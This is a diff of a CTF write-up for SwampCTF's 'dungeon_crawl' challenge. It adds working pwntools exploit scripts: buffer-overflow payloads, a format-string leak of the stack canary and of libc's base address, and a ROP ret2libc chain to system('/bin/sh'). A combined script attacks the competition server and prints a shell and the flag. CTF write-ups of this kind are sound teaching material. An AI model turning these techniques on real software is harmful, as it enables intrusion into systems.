@@ -84,7 +84,8 @@ Let's see how the input looks like in memory. See how `0x8048623` becomes `0x804
 ```
 
 So our winning input will replace '23' of `0x8048623` with '2d'.
-``` \x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x2d
+``` 
+\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x2d
 ```
 
 On to level4.
@@ -604,12 +605,237 @@ rdx            0x40	64
 ```
 Best part of it all is that the value of the stack canaries in `<overflow_small>` and `<format_string>` comes from the same source `QWORD PTR fs:0x28`. We can use the value of the stack canary we read in `<format_string>` in our stack smashing exploit using function `<overflow_small>`.
 
-Because the stack is not executable, we shall use the good old ROP to ret2libc. This is the pseudocode of what we will do to obtain a shell. This ROP chain contains 3 ROP gadgets.
+Because the stack is not executable, we shall use the good old ROP to ret2libc. This is the pseudocode of what we will do to obtain a shell. 
 ```
 1. Pop address of /bin/sh to rdi
-2. Set rsi and rdx to 0x0. 
-3. Return to <execve> in libc.
+2. Return to <system> in libc.
 ```
 
-To be continued...
+To obtain the real addresses of `'/bin/sh'` and `<system>`, we need to find their respective offsets in the shared library and the shared library's base address loaded into virtual memory.
 
+```
+from pwn import *
+r = process('./level5')
+elf = ELF('level5')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+r.recvuntil('[3 format]: ')
+r.sendline('3')
+
+# To obtain the stack canary's value
+r.recvuntil('The possibilities are endless!\n')
+r.sendline('%71$lxA')
+stack_can = int(r.recvuntil('A')[:-1], 16)
+log.info('Stack canary : ' + hex(stack_can))
+
+# To obtain the offset of the functions/ ROP gadgets in the shared library.
+puts_offset = libc.symbols['puts']
+system_offset = libc.symbols['system']
+binsh_offset = libc.search('/bin/sh').next()
+poprdi_ret_offset = libc.search(asm('pop rdi; ret', arch = 'amd64', os = 'linux')).next()
+
+# To find the base address of the shared library loaded into the executable.
+puts_got = elf.got['puts']
+print "puts_got       =", hex(puts_got) 
+puts_plt = elf.plt['puts']
+r.recvuntil('[3 format]: ')
+r.sendline('3')
+r.recvuntil('The possibilities are endless!\n')     #The newline character is VERY important. If you do not include it, the puts_addr returned will be very different from the correct one.
+r.sendline('%7$sAAAA' + p64(puts_got))
+puts_addr = r.recvuntil('AAAA')[:-4]
+for i in range(8 - len(puts_addr)):
+	puts_addr += '\x00'
+puts_addr = u64(puts_addr)
+base_addr_libc = puts_addr - puts_offset
+[...]
+```
+We use `puts` to get the base address of the shared library. This is because after `puts` was called once, its real address location was resolved by the resolver in the PLT, and sits in the GOT. Thus, we find the address of `puts`' GOT entry, and use the format string vulnerability to print out the value it points to. `%s` is the perfect choice as the argument given to it is the *pointer* to the string we want to print, and `puts`' GOT entry points to its real address.
+
+Our exploit is merely a chain of the real addresses of `'/bin/sh'`, `<system>` and the ROP gadget `pop rdi; ret`.
+```
+[...]
+binsh_addr = binsh_offset + base_addr_libc
+system_addr = system_offset + base_addr_libc
+poprdi_ret_addr = poprdi_ret_offset + base_addr_libc
+print "puts_offset    =", hex(puts_offset)
+print "puts_addr      =", hex(puts_addr) 
+print "base_addr_libc =", hex(base_addr_libc) 
+print "system_addr    =", hex(system_addr)
+print "binsh_addr     =", hex(binsh_addr)
+
+# Crafting the exploit
+exploit = ""
+exploit += "A" * 0x18
+exploit += p64(stack_can)
+exploit += "B" * 0x8
+exploit += p64(poprdi_ret_addr)
+exploit += p64(binsh_addr)
+exploit += p64(system_addr)
+
+r.recvuntil('[3 format]: ')
+r.sendline('1')
+r.recvuntil('extra challenge :)\n')
+r.sendline(exploit)
+r.interactive()
+```
+
+It works perfectly.
+```
+solomonbstoner@swjsUbuntu:~/Desktop/CTF unsorted and disorganised/SwampCTF/dungeon_crawl$ python input\ level5.py 
+[+] Starting local process './level5': pid 7438
+[*] '/home/solomonbstoner/Desktop/CTF unsorted and disorganised/SwampCTF/dungeon_crawl/level5'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Stack canary : 0x9e099b0c168d7300
+puts_got       = 0x601210
+puts_offset    = 0x6f690
+puts_addr      = 0x7f4381112690
+base_addr_libc = 0x7f43810a3000
+system_addr    = 0x7f43810e8390
+binsh_addr     = 0x7f438122fd57
+[*] Switching to interactive mode
+$ whoami
+solomonbstoner
+```
+
+### Putting them all together
+Now that we have managed to exploit all 5 levels individually, we need a Python script to exploit all of them in the Swampctf server.
+```
+from pwn import *
+
+r = remote('chal1.swampctf.com', 1337)
+libc = ELF('libc.so.6')
+
+# Level 1
+
+level1_exploit = '252534'
+r.recvuntil('Access token please: ')
+r.sendline(level1_exploit)
+log.info('Passed Level 1.')
+
+# Level 2
+
+level2_exploit = '\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\xc9\x07\xcc\x00'
+r.recvuntil('What is your party name? ')
+r.sendline(level2_exploit)
+log.info('Passed Level 2.')
+
+# Level 3
+
+level3_exploit = '\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x2d'
+r.recvuntil('what is your favorite spell? ')
+r.sendline(level3_exploit)
+log.info('Passed Level 3.')
+
+# Level 4
+
+ADDR_OF_GOAL = p32(0x804a47c)
+level4_exploit = "\x61" * 108 + ADDR_OF_GOAL
+r.recvuntil('action: ')
+r.sendline('73')
+r.recvuntil('your name? ')
+r.sendline(level4_exploit)
+log.info('Passed Level 4.')
+
+# Level 5
+
+elf = ELF('level5')
+
+r.recvuntil('[3 format]: ')
+r.sendline('3')
+r.recvuntil('The possibilities are endless!\n')
+r.sendline('%71$lxA')
+stack_can = int(r.recvuntil('A')[:-1], 16)
+log.info('Stack canary : ' + hex(stack_can))
+puts_offset = libc.symbols['puts']
+system_offset = libc.symbols['system']
+binsh_offset = libc.search('/bin/sh').next()
+poprdi_ret_offset = libc.search(asm('pop rdi; ret', arch = 'amd64', os = 'linux')).next()
+puts_got = elf.got['puts']
+
+puts_plt = elf.plt['puts']
+
+r.recvuntil('[3 format]: ')
+r.sendline('3')
+r.recvuntil('The possibilities are endless!\n')
+r.sendline('%7$sAAAA' + p64(puts_got))
+puts_addr = r.recvuntil('AAAA')[:-4]
+for i in range(8 - len(puts_addr)):
+	puts_addr += '\x00'
+puts_addr = u64(puts_addr)
+base_addr_libc = puts_addr - puts_offset
+
+binsh_addr = binsh_offset + base_addr_libc
+system_addr = system_offset + base_addr_libc
+poprdi_ret_addr = poprdi_ret_offset + base_addr_libc
+log.info ("puts_got    		=" + hex(puts_got))
+log.info ("puts_offset    	=" + hex(puts_offset))
+log.info ("puts_addr    	=" + hex(puts_addr))
+log.info ("base_addr_libc    	=" + hex(base_addr_libc))
+log.info ("system_addr    	=" + hex(system_addr))
+log.info ("binsh_addr    	=" + hex(binsh_addr))
+
+exploit = ""
+exploit += "A" * 0x18
+exploit += p64(stack_can)
+exploit += "B" * 0x8
+exploit += p64(poprdi_ret_addr)
+exploit += p64(binsh_addr)
+exploit += p64(system_addr)
+r.recvuntil('[3 format]: ')
+r.sendline('1')
+r.recvuntil('extra challenge :)\n')
+r.sendline(exploit)
+r.interactive()
+```
+
+And the challenge is solved! :)
+```
+$ python exploit.py 
+[+] Opening connection to chal1.swampctf.com on port 1337: Done
+[*] '/home/solomonbstoner/Desktop/CTF unsorted and disorganised/SwampCTF/dungeon_crawl/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Passed Level 1.
+[*] Passed Level 2.
+[*] Passed Level 3.
+[*] Passed Level 4.
+[*] '/home/solomonbstoner/Desktop/CTF unsorted and disorganised/SwampCTF/dungeon_crawl/level5'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] Stack canary : 0x36327c4ece0d200
+[*] puts_got            =0x601210
+[*] puts_offset        =0x6f690
+[*] puts_addr        =0x7efe76835690
+[*] base_addr_libc        =0x7efe767c6000
+[*] system_addr        =0x7efe7680b390
+[*] binsh_addr        =0x7efe76952d57
+[*] Switching to interactive mode
+$ whoami
+ctf
+$ ls
+flag
+level1
+level2
+level3
+level4
+level5
+$ cat flag
+flag{I_SurV1v3d_th3_f1n4l_b0ss}
+```
+
+END
